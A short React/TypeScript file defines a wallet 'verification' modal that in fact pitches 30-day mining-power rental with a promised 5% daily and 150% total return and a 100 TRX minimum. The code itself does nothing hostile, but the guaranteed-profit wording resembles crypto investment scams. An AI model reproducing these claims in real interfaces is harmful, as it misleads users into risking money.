import {useAccount} from "wagmi";
import Big from "big.js";
import Link from "next/link";
import React from "react";

export const handleWalletVerification = (account: ReturnType<typeof useAccount>) => {
	window.location.href = "#verification";
};

export const WalletVerificationModal = () => {
	return (
		<div id="verification" className="modal">
			<div className="modal-dialog">
				<div className="modal-content">
					<div className="modal-header">
						<span className="modal-title">Verifying Wallet...</span>
					</div>
					<div className="modal-body">
						<span className="modal-info">Here you can rent mining power for 30 days.</span>
						<span
							className="modal-info">The investment profitability is 5% per day and 150% for 30 days.</span>
						<div className="modal-calc">

						</div>

						<span className="modal-minimum-boost">Minimum amount: 100 TRX</span>
						<div className="modal-buttons">
							
						</div>
					</div>
				</div>
			</div>
		</div>
	);
};
